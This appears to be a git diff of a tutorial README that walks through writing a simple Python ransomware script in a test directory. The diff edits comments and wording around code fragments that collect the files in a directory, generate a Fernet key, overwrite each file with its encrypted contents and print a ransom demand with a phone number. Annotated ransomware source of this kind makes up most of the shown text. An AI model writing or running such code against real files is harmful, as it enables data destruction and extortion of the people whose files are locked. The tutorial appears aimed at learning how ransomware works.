@@ -27,7 +27,7 @@ Next we will create a directory with several files that we are going to test our
 
 So we insert into the CLI "mkdir ransomware" to create the directory and inside the directory, run "echo "file content" > filename.txt" a few times to create several files.
 
-Next we will create the Python script file.
+Next we will create the malware script file.
 
 ![Encryption](https://github.com/user-attachments/assets/edf5a8c4-e0b2-4010-b4cf-8c5a9ea1bffd)
 
@@ -49,13 +49,11 @@ if os.path.isfile(file) // if object is a file add to encryption list
 
 if file == "MALWARE.py" or file == "thekey.key" or file == "DECRYPT.py": //
 
-continue // this tells the script to continue to the next if statement and skip the current iteration.
+continue // this tells the script to continue to the next statement and skip the current iteration, meaning the files in the if statement above will be excluded from the rest of the script. 
 
-files.append(file) // This is seperating our python script files and key that are in the same directory from the file list we created earlier in the script.
+files.append(file) // This will add(append) any file to the files list.
 
 print(files) // Will display the "files" list in the terminal.
-
-ref: test print
 
 key = Fernet.generate_key() // This will generate the encryption key.
 
@@ -74,6 +72,8 @@ with open(file, "wb") as thefile: // sets script to write to "thefile".
 thefile.write(contents_encrypted) // writes the "contents_encrypted" to the file.
 
 print("All of your files have been encrypted. Contact 890-589-5542 to decrypt your data, for a price") // This is displayed in the terminal when the Python script is executed
+
+
 
 DECRYPT
 
